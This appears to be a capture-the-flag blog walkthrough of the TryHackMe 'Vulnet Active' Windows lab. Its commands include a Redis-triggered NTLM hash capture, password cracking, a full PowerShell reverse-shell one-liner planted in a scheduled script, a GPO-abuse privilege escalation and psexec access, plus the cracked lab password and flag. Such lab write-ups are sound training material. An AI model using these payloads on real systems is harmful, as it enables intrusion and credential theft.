---
title: Vulnet Active - Try Hack Me
date: 2021-11-07 07:07:07 +07:07
tags: [THM]
description: Medium rated machine from Try Hack Me
images: "/assets/img/active/active.png"
---

<figure>
<img src="/assets/img/active/active.png" alt="active">
<figcaption> Vulnet Active - Try Hack Me </figcaption>
</figure>

# Introduction

<a href="https://tryhackme.com/room/vulnnetactive" target="_blank" rel="noopener nofollow"> Vulnet Active</a> is a room from Try Hack Me which includes a request from redis server to capture the hash of enterprise-security's user. We can access the SMB with those creds and there is a powershell script which looks like a scheduled task. So, we change script to give us a reverse shell. For root, we run bloodhound and find that we have GenericWrite privileges on one of the GPO. So, we run <a href="https://github.com/byronkg/SharpGPOAbuse" target="_blank" rel="noopener nofollow">SharpGPOAbuse.exe</a> to escalate our user to Administrator.

# Nmap

{% highlight bash %}
# Nmap 7.91 scan initiated Mon Jan 31 04:12:07 2022 as: nmap -p53,135,139,445,464,6379,49665,49667,49669,49670,49683,49696,49722 -sC -sV -vv -oA nmap/ports 10.10.248.175
Nmap scan report for 10.10.248.175
Host is up, received echo-reply ttl 127 (0.36s latency).
Scanned at 2022-01-31 04:12:07 EST for 104s

PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
6379/tcp  open     redis         syn-ack ttl 127 Redis key-value store 2.8.2402
49665/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp filtered unknown       no-response
49669/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49683/tcp filtered unknown       no-response
49696/tcp filtered unknown       no-response
49722/tcp filtered unknown       no-response
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17126/tcp): CLEAN (Timeout)
|   Check 2 (port 57239/tcp): CLEAN (Timeout)
|   Check 3 (port 56820/udp): CLEAN (Timeout)
|   Check 4 (port 17011/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-31T09:13:16
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 31 04:13:51 2022 -- 1 IP address (1 host up) scanned in 104.12 seconds
{% endhighlight %}

# SMB

There is no access on guest/anonymous user but the domain is leaked.

{% highlight bash %}
% crackmapexec smb 10.10.248.175 -u '' -p ''
SMB         10.10.248.175   445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.10.248.175   445    VULNNET-BC3TCK1  [-] vulnnet.local\: STATUS_ACCESS_DENIED 
{% endhighlight %}

# Redis

Checking for redis in hacktricks, we find <a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html" target="_blank" rel="noopener nofollow">LUA sandbox bypass</a>, which describes about hacking redis via HTTP Requests. So, let's try to connect from redis' server and start a responder to catch the hash.

# NTLM Hash

{% highlight bash %}
% redis-cli -h 10.10.248.175
10.10.248.175:6379> eval "dofile('//10.18.25.218/zex')" 0
(error) ERR Error running script (call to f_648174d937245e390c24fab91e2ed0b1f39af8fa): @user_script:1: cannot open //10.18.25.218/zex: Permission denied 
(9.38s)
10.10.248.175:6379> 

$ sudo responder -I tun0

[ ----- SNIP -----]
[SMB] NTLMv2-SSP Client   : 10.10.248.175
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:8900f350aacb86ba:59A8E887432500EC2651A0AF3CC90A4B:010100000000000080FDBB345B16D801AB035CD0D5C01EF400000000020008004E00440032004F0001001E00570049004E002D004A005900510053004F0037004D00460043004C00550004003400570049004E002D004A005900510053004F0037004D00460043004C0055002E004E00440032004F002E004C004F00430041004C00030014004E00440032004F002E004C004F00430041004C00050014004E00440032004F002E004C004F00430041004C000700080080FDBB345B16D8010600040002000000080030003000000000000000000000000030000094A3656A068C685B12C2A013265CAE9AD297CB1BBDA9BDAFC4BCF142B0AFCE190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310038002E00320035002E003200310038000000000000000000
[*] Skipping previously captured hash for VULNNET\enterprise-security

% john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sand_0873959498  (enterprise-security)
1g 0:00:00:01 DONE (2022-01-31 04:34) 0.5780g/s 2320Kp/s 2320Kc/s 2320KC/s sandoval69..sand36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

{% endhighlight%}

And now we access to SMB, with those creds. We find a powershell script which looks like a scheduled job. So, let's change it to give ourself a reverse using nishang one line powershell reverse shell.

{% highlight bash %}
crackmapexec smb 10.10.248.175 -u 'enterprise-security' -p 'sand_0873959498' --shares
SMB         10.10.248.175   445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.10.248.175   445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.10.248.175   445    VULNNET-BC3TCK1  [+] Enumerated shares
SMB         10.10.248.175   445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.10.248.175   445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         10.10.248.175   445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         10.10.248.175   445    VULNNET-BC3TCK1  C$                              Default share
SMB         10.10.248.175   445    VULNNET-BC3TCK1  Enterprise-Share READ            
SMB         10.10.248.175   445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         10.10.248.175   445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.10.248.175   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
{% endhighlight %}

# Reverse Shell

{% highlight bash %}
% smbclient \\\\vulnnet.local\\Enterprise-Share -U enterprise-security
Enter WORKGROUP\enterprise-security's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb 23 17:45:41 2021
  ..                                  D        0  Tue Feb 23 17:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021

                9558271 blocks of size 4096. 5130697 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1 
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> ^C

% cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue

% vi PurgeIrrelevantData_1826.ps1 

% cat PurgeIrrelevantData_1826.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.18.25.218",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
{% endhighlight %}

And now we wait for reverse to come back.

{% highlight bash %}
% smbclient \\\\vulnnet.local\\Enterprise-Share -U enterprise-security
Enter WORKGROUP\enterprise-security's password: 
Try "help" to get a list of possible commands.
smb: \> put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \> put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \> put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.5 kb/s) (average 0.5 kb/s)
smb: \> ^C

% rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.18.25.218] from (UNKNOWN) [10.10.248.175] 50033
whoami
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads> 
{% endhighlight %}

# GPO

Since this is AD, we run bloodhound to check permissions and we find out that we have generic write permission to one of GPO. Let's use SharpGPOAbuse.exe to update our user to Administrator.

<figure>
<img src="/assets/img/active/blood.png" alt="Bloddhound">
<figcaption> Bloodhound </figcaption>
</figure>

{% highlight bash %}
PS C:\Users\enterprise-security\Downloads>.\SharpGPOAbuse.exe --AddComputerTask --TaskName "PissOFF" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN" --Force
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
{% endhighlight %}

And, now we can login as Administrator with the same creds.

{% highlight bash %}
psexec.py enterprise-security:sand_0873959498@10.10.193.68
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.193.68.....
[*] Found writable share ADMIN$
[*] Uploading file lhSSLqub.exe
[*] Opening SVCManager on 10.10.193.68.....
[*] Creating service Dxat on 10.10.193.68.....
[*] Starting service Dxat.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd \users\administrator\desktop

C:\Users\Administrator\Desktop> type root.txt
The system cannot find the file specified.

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is AAC5-C2C2

 Directory of C:\Users\Administrator\Desktop

02/23/2021  08:27 PM    <DIR>          .
02/23/2021  08:27 PM    <DIR>          ..
02/23/2021  08:27 PM                37 system.txt
               1 File(s)             37 bytes
               2 Dir(s)  21,137,522,688 bytes free

C:\Users\Administrator\Desktop> type system.txt
THM{d540c0645975900e5bb9167aa431fc9b}
C:\Users\Administrator\Desktop> 
{% endhighlight %}
